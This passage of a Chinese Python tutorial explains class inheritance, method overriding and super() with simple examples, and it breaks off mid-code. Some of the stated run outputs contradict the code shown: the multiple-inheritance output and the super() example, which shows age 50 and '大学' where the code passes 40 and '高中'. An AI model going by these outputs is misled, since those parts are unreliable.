title="引入"></a>引入</h2><p><code>继承</code>，通俗的说就是不劳而获，不需要付出一下子什么都有了</p><p>Python中也有<code>继承</code>这个功能，<code>它能够实现一个类中可以使用另外一个类中的代码</code></p><p>在开发较大的项目时，往往需要多个类实现，当我们定义一个<code>新类</code>时如果这个新的类的功能与之前某个类功能很类似，此时通过使用<code>继承</code>可以让新类<code>不用写</code>代码或者<code>写很少</code>的代码，就实现了想要的所有功能，这样一来编写的代码少了也就<code>提高</code>了<code>开发效率</code></p><h2 id="格式定义"><a href="#格式定义" class="headerlink" title="格式定义"></a>格式定义</h2><p>生活中，如果子女想要继承父辈的遗产，往往需要一定的证明素材，这样才有合法性；同理Python中想要表示出谁继承谁，也需要一定的格式来规定，这种方式就是在定义类的<code>()</code>中写上父类的名字。</p><p>如下示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):  <span class="comment"># 继承Animal</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):  <span class="comment"># 继承Animal</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BoSiCat</span>(<span class="title class_ inherited__">Cat</span>):  <span class="comment"># 继承Cat</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="在继承中的专用术语"><a href="#在继承中的专用术语" class="headerlink" title="在继承中的专用术语"></a>在继承中的专用术语</h2><p>为了更加清楚的标记处，谁继承了谁，我们用<code>父类（基类）</code>、<code>子类(派生类)</code>来称呼它们</p><ul><li>父类：被继承的类</li><li>子类：继承的类</li></ul><p>代码示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 父类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># 构造方法 给这个类的实例对象去创建属性</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_num</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.num + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = B()</span><br><span class="line"><span class="built_in">print</span>(b.num)</span><br><span class="line">b.print_num()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在当前的这个案例中</span></span><br><span class="line"><span class="string">    除了实例方法被继承之外, 构造方法也被继承了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">10</span><br><span class="line">20</span><br></pre></td></tr></table></figure><p>从上述的运行结果来看，虽然<code>类B</code>没有写代码，但是依然能够正确的执行，这足以说明<code>类B</code>继承了<code>类A</code>的功能</p><blockquote><p><strong>在Pycharm中</strong>，<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211051310824.png" alt="image-20221105131052157" style="zoom: 67%;" />左边蓝色图标表示继承关系，并且箭头向下表示该类有子类~~</p></blockquote><h1 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h1><h2 id="单继承的概念"><a href="#单继承的概念" class="headerlink" title="单继承的概念"></a>单继承的概念</h2><p><code>单继承</code>，就是一个子类只<code>继承一个父类</code></p><p>下面定义了2个类，<code>Animal</code>类是父类它编写了<code>吃</code>、<code>喝</code>、<code>睡</code>3个功能，<code>Dog</code>类是子类它继承了<code>Animal</code>的功能</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;吃饭...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;喝水...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sleep</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;睡觉...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dog = Dog()</span><br><span class="line">dog.eat()</span><br><span class="line">dog.drink()</span><br><span class="line">dog.sleep()</span><br></pre></td></tr></table></figure><p>运行上述代码，会看到如下效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">吃饭...</span><br><span class="line">喝水...</span><br><span class="line">睡觉...</span><br></pre></td></tr></table></figure><h2 id="为类添加新功能"><a href="#为类添加新功能" class="headerlink" title="为类添加新功能"></a>为类添加新功能</h2><p>假如现在需要在上述的代码中，添加一个新的方法<code>info</code>，那么该写到父类中还是子类中呢？</p><blockquote><p>写到父类</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="comment"># 详细信息</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义三个实例方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;吃饭...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;喝水...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sleep</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在睡觉...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;我叫: <span class="subst">&#123;self.name&#125;</span>, 年龄: <span class="subst">&#123;self.age&#125;</span>岁&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dog = Dog(<span class="string">&#x27;旺财&#x27;</span>, <span class="number">3</span>)</span><br><span class="line">dog.eat()</span><br><span class="line">dog.drink()</span><br><span class="line">dog.sleep()</span><br><span class="line">dog.info()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果我现在想要给当前的狗类添加一个方法</span></span><br><span class="line"><span class="string">    打印当前这个狗类创建的实例对象的一些信息</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">这种写法有没有什么问题？</span></span><br><span class="line"><span class="string">    因为子类继承了父类 父类中有一个构造方法 子类在实例化对象时需要满足父类中的构造方法</span></span><br><span class="line"><span class="string">    在子类创建实例对象时需要传递参数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    如果有其他子类 在其他子类中并不需要打印详细信息，如果按照当前的这种写法 则不需要打印详细信息的类也会具有当前的info方法</span></span><br><span class="line"><span class="string">    浪费....</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    一般在开发时， 在父类中只是定义一些通用的方法 即: 在子类中都会使用到的方法</span></span><br><span class="line"><span class="string">    如果在子类中有独有的方法: 定义在子类</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>从上述的运行来看，虽然<code>Animal</code>类中没有<code>name</code>属性、<code>age</code>属性，但是可以在子类中添加这<code>2</code>个属性，只要方法被子类继承后，通过子类的对象调用时可以直接使用子类的属性</p><p>但是，要注意如果在父类<code>Animal</code>中如果没有<code>name</code>、<code>age</code>那么也就意味着不能直接创建<code>Animal</code>类的实例对象，否则当通过<code>Animal</code>的实例对象调用<code>info</code>方法时就会出现找不到<code>name</code>、<code>age</code>属性的问题</p><p><strong>也就是意味着这种方式创建的子类，需要携带参数</strong></p><blockquote><p>写到子类</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;吃饭...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;喝水...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sleep</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;睡觉...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;名字是：&quot;</span> + self.name + <span class="string">&quot;, 年龄是：&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dog = Dog(<span class="string">&quot;小黑&quot;</span>, <span class="number">2</span>)</span><br><span class="line">dog.eat()</span><br><span class="line">dog.drink()</span><br><span class="line">dog.sleep()</span><br><span class="line">dog.info()</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">吃饭...</span><br><span class="line">喝水...</span><br><span class="line">睡觉...</span><br><span class="line">名字是：小黑, 年龄是：2</span><br></pre></td></tr></table></figure><h2 id="两种定义方式的区别"><a href="#两种定义方式的区别" class="headerlink" title="两种定义方式的区别"></a>两种定义方式的区别</h2><ol><li>当前将新方法定义到子类中不会对父类造成影响，保持父类的“纯净”</li><li>如果将新方法定义到父类中则继承这个父类的所有子类都会获得这个新方法, 但是有些子类并不需要</li><li><strong>如果将新方法定义到父类中可能导致父类无法实例化</strong></li></ol><p>总结：</p><p>如果一个方法在多个子类中用到，那么就定义在父类的方法中，否则就定义在子类中。</p><h1 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h1><h2 id="多继承的概念"><a href="#多继承的概念" class="headerlink" title="多继承的概念"></a>多继承的概念</h2><p>如果一个类继承了多个父类，那么这就是多继承</p><h2 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h2><p>单继承时在类<code>()</code>中写一个父类的名字，那么多继承就需要在<code>()</code>中写多个父类的名字而且用英文逗号<code>,</code>进行分割</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B):  <span class="comment"># 继承了A、B类</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="多继承的应用"><a href="#多继承的应用" class="headerlink" title="多继承的应用"></a>多继承的应用</h2><p>我们都知道今天的手机功能已经非常全面了，而且还在突风猛进的进化中，不仅有电话功能还有照相功能（参照照相机）、播放音乐（参照MP3）等，下面我们通过一步步的展示方式来揭晓多继承的真实作用价值所在。</p><p>首先我们定义一个普通的手机<code>Telephone</code>（即很久之前的功能机）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Telephone</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在打电话...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">answer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;接电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在接电话...&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果我们想要让手机拥有照相机的功能，此时就需要定义一个照相机类<code>Camera</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Camera</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">take_photo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;拍照功能&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在拍照...&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后让Telephone继承Camera</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Camera</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">take_photo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;拍照功能&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在拍照...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Telephone</span>(<span class="title class_ inherited__">Camera</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在打电话...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">answer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;接电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在接电话...&quot;</span>)</span><br></pre></td></tr></table></figure><p>创建一个手机对象，此时就手机就继承了拍照功能</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Camera</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">take_photo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;拍照功能&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在拍照...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Telephone</span>(<span class="title class_ inherited__">Camera</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在打电话...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">answer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;接电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在接电话...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phone = Telephone()</span><br><span class="line">phone.call()</span><br><span class="line">phone.answer()</span><br><span class="line">phone.take_photo()</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">正在打电话...</span><br><span class="line">正在接电话...</span><br><span class="line">正在拍照...</span><br></pre></td></tr></table></figure><p>如果想要让手机拥有听音乐的功能，我们可以定于一个<code>MP3</code>类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MP3</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_music</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;播放音乐功能&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在播放音乐...&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后让手机Telephone类继承MP3类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下代码是当前手机的功能 作为父类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Camera</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">take_photo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在拍照...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mp3</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_music</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在放音乐...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 手机类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelPhone</span>(Camera, Mp3):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在打电话...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在发送短信...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 想要创建一个手机 让这个手机有拍照的功能</span></span><br><span class="line">phone = TelPhone()</span><br><span class="line"></span><br><span class="line">phone.call()</span><br><span class="line">phone.send_message()</span><br><span class="line">phone.take_photo()</span><br><span class="line">phone.play_music()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">可以把手机的功能拆分成一个个的类</span></span><br><span class="line"><span class="string">    通过多继承的方式调用多个父类中的方法</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    功能与功能之间相互独立的。如果我现在需要修改一个功能 会不会对另外的一个手机功能产生影响？</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    解耦</span></span><br><span class="line"><span class="string">        高内聚低耦合</span></span><br><span class="line"><span class="string">            高内聚就是说相关度比较高的部分尽可能的集中，不要分散</span></span><br><span class="line"><span class="string">            在功能模块之间，变量与变量之间有高度的耦合关系？</span></span><br><span class="line"><span class="string">                多个方法可以控制一个变量？</span></span><br><span class="line"><span class="string">                意思差不多就是要做的事情相似，对同样的目标进行操作</span></span><br><span class="line"><span class="string">   低耦合就是说两个相关的模块尽可以能把依赖的部分降低到最小，不要让两个系统产生强依赖</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>带有音乐功能的手机就做好了，试试看：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">正在打电话...</span><br><span class="line">正在接电话...</span><br><span class="line">正在拍照...</span><br><span class="line">正在播放音乐...</span><br></pre></td></tr></table></figure><h1 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h1><h2 id="引入-4"><a href="#引入-4" class="headerlink" title="引入"></a>引入</h2><p>我们知道一个子类如果继承了父类，那么当通过子类对象去调用一个方法时，如果子类对象中没有此方法，那么就会到继承的父类中查询，如果查询到有则进行调用</p><p>但是有时，我们发现子类继承的父类的方法不能100%满足子类对象的需求，则此时就需要在子类中定义一个与父类相同的名字的方法，此时子类对象调用这个方法时即使父类中有，但依然不会调用，而是调用子类中的方法。</p><h2 id="什么是重写"><a href="#什么是重写" class="headerlink" title="什么是重写"></a>什么是重写</h2><p>我们把子类中定义了与父类中相同名字的方法，叫做<code>重写</code>（大白话就是：子类的方法覆盖了父类中的同名方法）</p><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_game</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类中的play_game&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类中的drink方法&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span>(<span class="title class_ inherited__">Father</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_game</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;子类中的play_game&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">father = Father()</span><br><span class="line">father.play_game()  <span class="comment"># 调用父类中的方法，因为对象是父类创建的</span></span><br><span class="line"></span><br><span class="line">son = Son()</span><br><span class="line">son.play_game()  <span class="comment"># 调用子类中的方法，因为在子类中重写了play_game方法</span></span><br><span class="line">son.drink()  <span class="comment"># 调用父类中的方法，因为子类中并没有重写此方法</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">父类中的play_game</span><br><span class="line">子类中的play_game</span><br><span class="line">父类中的drink方法</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果父类中的方法在子类继承时发现并不符合子类的需求，此时我们在子类中重写这个方法即可</p><blockquote><p><code>切记</code>：不要直接在父类中修改此方法，如果将父类中的方法改成你子类的功能，虽然子类创建的对象可以100%满足要求，但你并不能保证其它继承这个父类的子类也需要同样的功能，所以在以后的开发工作中<strong>，一个父类定义好了之后，就不要轻易的修改</strong>，否则继承它的子类都要进行修改，这个工作量是非常大的，请不要这么做</p></blockquote><blockquote><p>在Pycharm中，重写有如下标记，表示该方法的重写和原方法</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211051316436.png" alt="image-20221105131607925" style="zoom:50%;" /></blockquote><h1 id="super-方法"><a href="#super-方法" class="headerlink" title="super 方法"></a>super 方法</h1><h2 id="引入-5"><a href="#引入-5" class="headerlink" title="引入"></a>引入</h2><p>上一节课程我们知道，如果父类中的方法在派生的子类中不能满足其需求的话，可以在子类中通过重写解决这个问题</p><p>但是很多情况下，父类中的方法并不是全部一点都不能用，即子类的需求往往是在父类方法实现的功能基础上提出了更多的需求而已，此时如果我们在子类中重写此方法时就会发现出现了很多冗余的代码，这个问题该怎么解决呢？</p><p>答：在子类重写的方法中通过调用父类中被重写的方法</p><h2 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h2><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_game</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类中的play_game&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span>(<span class="title class_ inherited__">Father</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_game</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().play_game()  <span class="comment"># 先调用父类被重写的方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;子类中的play_game&quot;</span>)  <span class="comment"># 然后再添加子类需要的新功能</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">son = Son()</span><br><span class="line">son.play_game()  <span class="comment"># 调用子类中的方法，因为在子类中重写了play_game方法</span></span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">父类中的play_game</span><br><span class="line">子类中的play_game</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># __str__  # 通过print(实例对象) 会自动调用__str__ 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>的年龄是: <span class="subst">&#123;self.age&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span>(<span class="title class_ inherited__">Father</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, collage</span>):</span><br><span class="line">        <span class="comment"># 需要在子类的构造方法中调用父类的构造方法</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name, age)  <span class="comment"># 因为在父类中有两个实例属性 在子类中将两个实例属性传递给父类</span></span><br><span class="line">        self.collage = collage</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>的年龄是: <span class="subst">&#123;self.age&#125;</span>, 学历是: <span class="subst">&#123;self.collage&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">father = Father(<span class="string">&#x27;父亲&#x27;</span>, <span class="number">40</span>)</span><br><span class="line"><span class="built_in">print</span>(father)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">son = Son(<span class="string">&#x27;儿子&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;高中&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(son)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果在子类中重写了父类的构造方法 并且在父类中构造方法中的参数子类也会使用到</span></span><br><span class="line"><span class="string">则可以使用super().__init__() 将父类所需要的参数进行传递 </span></span><br><span class="line"><span class="string">并可以在子类中创建属于这个子类的独有的实例属性</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">父亲的年龄是: 50</span><br><span class="line">儿子的年龄是: 18，他的学历是: 大学</span><br></pre></td></tr></table></figure><p>示例三：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># __str__  # 通过print(实例对象) 会自动调用__str__ 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>的年龄是: <span class="subst">&#123;self.age&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span>(<span class="title class_ inherited__">Father</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, collage</span>):</span><br><span class="line">        <span class="comment"># 需要在子类的构造方法中调用父类的构造方法</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name, age)  <span class="comment"># 因为在父类中有两个实例属性 在子类中将两个实例属性传递给父类</span></span><br><span class="line">        self.collage = collage</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span 